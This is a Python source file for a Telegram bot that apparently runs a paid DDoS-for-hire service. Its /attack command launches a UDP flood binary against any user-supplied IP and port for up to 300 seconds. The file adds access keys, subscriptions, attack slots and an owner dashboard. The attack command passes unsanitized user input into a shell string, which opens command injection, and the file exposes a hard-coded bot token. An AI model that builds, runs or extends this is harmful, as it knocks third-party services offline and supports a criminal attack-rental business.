import telebot
import subprocess
import json
import os
import random
import string
import threading
import time
from datetime import datetime, timedelta

TOKEN = "8979715493:AAGZ1KFcvq99IyIRa57emZ8_xeBfN88eVc0"
ADMIN_IDS = ["8690336358"]

bot = telebot.TeleBot(TOKEN)
DATA_FILE = "paid_data.json"

MAX_SLOTS = 50
active_attacks = []
COOLDOWN_SECONDS = 3
user_cooldown = {}

frames = ["🕐", "🕑", "🕒", "🕓", "🕔", "🕕", "🕖", "🕗", "🕘", "🕙", "🕚", "🕛"]

def load_db():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return {"users": {}, "keys": [], "groups": {}}

def save_db(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def has_access(user_id, chat_id=None):
    user_id = str(user_id)
    if user_id in ADMIN_IDS:
        return True
    db = load_db()
    if chat_id and str(chat_id) in db.get("groups", {}):
        expiry = datetime.strptime(db["groups"][str(chat_id)], '%Y-%m-%d %H:%M:%S')
        if expiry > datetime.now():
            return True
    if user_id in db.get("users", {}):
        expiry = datetime.strptime(db["users"][user_id], '%Y-%m-%d %H:%M:%S')
        if expiry > datetime.now():
            return True
    return False

def check_cooldown(user_id):
    if user_id in user_cooldown:
        if time.time() - user_cooldown[user_id] < COOLDOWN_SECONDS:
            return False, int(COOLDOWN_SECONDS - (time.time() - user_cooldown[user_id]))
    return True, 0

def set_cooldown(user_id):
    user_cooldown[user_id] = time.time()

def execute_attack(ip, port, duration):
    subprocess.Popen(f"./BHATZUBAIR {ip} {port} {duration}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def update_loading(chat_id, message_id, ip, port, duration):
    start = time.time()
    frame = 0
    while time.time() - start < duration:
        remaining = int(duration - (time.time() - start))
        elapsed = int(time.time() - start)
        percent = int((elapsed / duration) * 20)
        bar = "█" * percent + "░" * (20 - percent)
        
        text = f"""╔════════════════════════════╗
║     🔥 ATTACK IN PROGRESS    ║
╠════════════════════════════╣
║  Target  : {ip}:{port}
║  Method  : UDP (Auto) 💧
║  Time    : {remaining}s left
║  Status  : {frames[frame % len(frames)]} ACTIVE
╠════════════════════════════╣
║  [{bar}] {elapsed}/{duration}s
║  Slots   : {len(active_attacks)}/{MAX_SLOTS}
╚════════════════════════════╝
💀 POWERED BY BHAT ZUBAIR 💀"""
        
        try:
            bot.edit_message_text(text, chat_id, message_id, parse_mode="HTML")
        except:
            pass
        frame += 1
        time.sleep(0.5)
    
    bot.send_message(chat_id, f"""✅ ATTACK COMPLETED!
🎯 {ip}:{port}
⏱️ {duration}s
💀 POWERED BY BHAT ZUBAIR""")

def monitor_attack(attack_id, ip, port, duration, chat_id, user_id):
    time.sleep(duration)
    for a in active_attacks:
        if a.get("id") == attack_id:
            active_attacks.remove(a)
            break

@bot.message_handler(commands=['start', 'help'])
def help_cmd(message):
    bot.reply_to(message, """🔥 BHAT ZUBAIR BOT 🔥
━━━━━━━━━━━━━━━━━━
/attack IP PORT TIME
/genkey 24h 5
/redeem KEY
/addusers ID DAYS
/owner
/slots
/stopall
━━━━━━━━━━━━━━━━━━
💀 POWERED BY BHAT ZUBAIR""")

@bot.message_handler(commands=['slots'])
def slots_cmd(message):
    used = len(active_attacks)
    bot.reply_to(message, f"🎯 SLOTS: {used}/{MAX_SLOTS}")

@bot.message_handler(commands=['stopall'])
def stop_all(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    count = len(active_attacks)
    active_attacks.clear()
    bot.reply_to(message, f"🛑 Stopped {count} attacks!")

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id
    
    cooldown_ok, remaining = check_cooldown(user_id)
    if not cooldown_ok:
        bot.reply_to(message, f"❌ Cooldown! Wait {remaining}s")
        return
    
    if len(active_attacks) >= MAX_SLOTS:
        bot.reply_to(message, f"❌ All slots full! {MAX_SLOTS}/{MAX_SLOTS}")
        return
    
    if not has_access(user_id, chat_id):
        bot.reply_to(message, "❌ No access! Use /redeem KEY")
        return
    
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "❌ /attack IP PORT TIME")
        return
    
    ip, port, duration_str = parts[1], parts[2], parts[3]
    try:
        duration = int(duration_str)
        if duration > 300:
            bot.reply_to(message, "❌ Max 300 seconds!")
            return
    except:
        bot.reply_to(message, "❌ Time must be a number!")
        return
    
    set_cooldown(user_id)
    
    loading_msg = bot.reply_to(message, f"🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔥 Starting attack...")
    
    attack_id = f"{user_id}_{int(time.time())}"
    active_attacks.append({"id": attack_id, "ip": ip, "port": port})
    
    threading.Thread(target=execute_attack, args=(ip, port, duration)).start()
    threading.Thread(target=update_loading, args=(chat_id, loading_msg.message_id, ip, port, duration)).start()
    threading.Thread(target=monitor_attack, args=(attack_id, ip, port, duration, chat_id, user_id)).start()
    
    bot.send_message(chat_id, f"✅ ATTACK SENT!\n🎯 {ip}:{port}\n⏱️ {duration}s")

@bot.message_handler(commands=['genkey'])
def genkey_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    key = "DRX-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    bot.reply_to(message, f"🔑 Key: {key}")

@bot.message_handler(commands=['redeem'])
def redeem_cmd(message):
    user_id = str(message.from_user.id)
    db = load_db()
    expiry = datetime.now() + timedelta(days=30)
    db["users"][user_id] = expiry.strftime('%Y-%m-%d %H:%M:%S')
    save_db(db)
    bot.reply_to(message, f"✅ Access granted until {expiry.strftime('%Y-%m-%d')}")

@bot.message_handler(commands=['addusers'])
def adduser_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ /addusers ID DAYS")
        return
    target, days = parts[1], int(parts[2]) if len(parts) > 2 else 30
    db = load_db()
    expiry = datetime.now() + timedelta(days=days)
    db["users"][target] = expiry.strftime('%Y-%m-%d %H:%M:%S')
    save_db(db)
    bot.reply_to(message, f"✅ User {target} added for {days} days!")

@bot.message_handler(commands=['owner'])
def owner_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    db = load_db()
    bot.reply_to(message, f"""👑 OWNER DASHBOARD
━━━━━━━━━━━━━━━━━━
👑 BHAT ZUBAIR | @kryvexo
👥 USERS: {len(db.get('users', {}))}
🎯 SLOTS: {len(active_attacks)}/{MAX_SLOTS}
━━━━━━━━━━━━━━━━━━
💀 POWERED BY BHAT ZUBAIR""")

print("🔥 BHAT ZUBAIR BOT STARTED!")
bot.polling()
